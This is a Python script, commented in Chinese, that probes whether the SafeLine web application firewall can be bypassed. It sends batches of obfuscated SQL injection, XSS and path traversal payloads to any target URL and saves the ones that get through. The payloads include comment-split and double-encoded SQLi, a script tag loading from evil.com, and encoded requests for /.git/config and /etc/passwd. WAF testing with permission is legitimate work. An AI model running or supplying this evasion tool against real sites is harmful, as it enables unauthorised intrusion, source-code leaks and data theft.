#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
雷池 SafeLine WAF 批量绕过探测脚本（可复用）
用法:
    python3 waf_batch_probe.py <target_base> [--param id] [--delay 0.2] [--out /tmp/waf_pass.json]
示例:
    python3 waf_batch_probe.py https://example.com/ --param q

注意:
  - 路径层测试 payload 必须拼进 URI 路径（TARGET + path），绝不能放 query 参数（假阳性根源）
  - 穿透必须用后端 nginx access.log 二次确认（grep 请求串）
  - 每 payload 间隔 delay 秒，防 WAF 频率限制
  - 分类: BLOCKED=403+event_id / PASSED=200+首页特征 / OTHER(400|404)=origin 拒绝
"""
import urllib.request, urllib.parse, urllib.error, ssl, time, json, sys, argparse

HOME_MARK = b'overflow-y-scroll scroll-smooth'  # 首页 HTML 特征串，按目标修改
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"

def make_ctx():
    return ssl.create_default_context()

def test_raw(url, headers=None, ctx=None):
    h = {"User-Agent": UA}
    if headers: h.update(headers)
    req = urllib.request.Request(url, headers=h)
    try:
        r = urllib.request.urlopen(req, timeout=12, context=ctx)
        return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()
    except Exception as e:
        return -1, str(e).encode()

def classify(code, body):
    if code == 403 and b'event_id' in body: return 'BLOCKED'
    if code == 200 and HOME_MARK in body: return 'PASSED'
    return f'OTHER({code})'

def run(name, items, target, param='id', pre_encoded=False, delay=0.2, ctx=None, out=None):
    passed = []
    for p in items:
        if pre_encoded:
            url = f"{target}?{param}={p}"
        else:
            url = f"{target}?{param}={urllib.parse.quote(p, safe='')}"
        code, body = test_raw(url, ctx=ctx)
        cls = classify(code, body)
        if cls == 'PASSED':
            passed.append(p)
            if out is not None:
                out.append({"cat": name, "payload": p, "param": param, "pre_encoded": pre_encoded})
            print(f"  >>> PASS: {p[:90]}")
        time.sleep(delay)
    print(f"[{name}] passed={len(passed)}/{len(items)}")
    return passed

def run_paths(name, paths, target, delay=0.2, ctx=None, out=None):
    """路径层: payload 拼进 URI 路径（关键！）"""
    passed = []
    for p in paths:
        url = target.rstrip('/') + p
        code, body = test_raw(url, ctx=ctx)
        cls = classify(code, body)
        if cls == 'PASSED':
            passed.append(p)
            if out is not None:
                out.append({"cat": name, "payload": p, "param": "PATH", "pre_encoded": True})
            print(f"  >>> PASS: {p[:90]}")
        time.sleep(delay)
    print(f"[{name}] passed={len(passed)}/{len(paths)}")
    return passed

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("target", help="e.g. https://example.com/")
    ap.add_argument("--param", default="id")
    ap.add_argument("--delay", type=float, default=0.2)
    ap.add_argument("--out", default="/tmp/waf_pass_results.json")
    args = ap.parse_args()

    ctx = make_ctx()
    out = []

    # ---- 基线 ----
    print("== baseline ==")
    for label, url in [
        ("normal", f"{args.target}?{args.param}=1"),
        ("sqli", f"{args.target}?{args.param}={urllib.parse.quote(\"1' AND '1'='1\", safe='')}"),
        ("xss", f"{args.target}?{args.param}={urllib.parse.quote('<script>alert(1)</script>', safe='')}"),
    ]:
        code, body = test_raw(url, ctx=ctx)
        print(f"  {label}: {classify(code, body)}")
        time.sleep(args.delay)

    # ---- SQLi 矩阵 ----
    sqli = [
        "1' AND '1'='1", "1' AnD '1'='1",
        "1'/**/AND/**/'1'='1", "1'/*!AND*/'1'='1", "1' AND-- -'1", "1' AND# '1'='1",
        "1'%0aAND%0a'1'='1", "1'%09AND%09'1'='1", "1'%0bAND%0b'1'='1", "1'%0cAND%0c'1'='1",
        "1' AN/**/D '1'='1", "1' A/**/ND '1'='1", "1' AN%0aD '1'='1",
        "1' UN/**/ION SE/**/LECT 1,2,3-- -", "1' UN%0aION SE%0aLECT 1,2,3-- -",
        "1'||'1", "1'/**/||/**/'1", "1'||'1'-- -",
        "1` OR `1`=`1", "1`||`1",
        "1' OR １=１-- -", "1' OR ①=①-- -", "1%EF%BC%87 OR 1=1-- -",
        "1%2527%257C%257C%25271",
        "1' OR 1=1-- -", "1' UNION SELECT 1,2,3-- -", "1' OR sleep(5)-- -",
    ]
    run("sqli", sqli, args.target, param=args.param, delay=args.delay, ctx=ctx, out=out)

    # ---- XSS 矩阵 ----
    xss = [
        "<script>alert(1)</script>", "<ScRiPt>alert(1)</ScRiPt>",
        "<scr<script>ipt>alert(1)</scr</script>ipt>",
        "<svg/onload=alert(1)>", "<svg/onload=alert//(1)>", "<svg/onload=alert%0a(1)>",
        "<svg/onload=${alert(1)}>",
        "<img src=x onerror=alert(1)>", "<img src=x onerror=alert (1)>",
        "alert`1`", "prompt`1`", "alert`document.domain`",
        "${alert(1)}", "${alert`1`}",
        "&#60;script&#62;alert(1)&#60;/script&#62;",
        "%253Cscript%253Ealert(1)%253C%252Fscript%253E",
        "<script src=//evil.com/x.js></script>",
    ]
    run("xss", xss, args.target, param=args.param, delay=args.delay, ctx=ctx, out=out)

    # ---- 路径矩阵（payload 在 URI 路径）----
    paths = [
        "/.git/config", "/.Git/config", "/.GIT/config", "/.git/HEAD",
        "/.git//config", "/.git/./config", "/./.git/config",
        "/.%67it/config", "/%2e%67%69%74/config", "/.git%00/config",
        "/.git;/config", "//.git/config", "/a/../.git/config",
        "/.git%2fconfig", "/.git%5cconfig", "/%c0%ae%c0%ae/etc/passwd",
        "/....//etc/passwd", "/..;/etc/passwd", "/%2e%2e%2f/etc/passwd",
        "/posts/../../.git/config",
    ]
    run_paths("paths", paths, args.target, delay=args.delay, ctx=ctx, out=out)

    # ---- 汇总 ----
    print(f"\n== total penetrated: {len(out)} ==")
    for r in out:
        print(f"  [{r['cat']}] {r['payload'][:90]}")
    with open(args.out, "w") as f:
        json.dump(out, f, ensure_ascii=False, indent=2)
    print(f"saved {args.out}")
    print("\nNEXT: grep backend nginx access.log for penetrated payloads to confirm real pass (ironclad proof).")

if __name__ == "__main__":
    main()
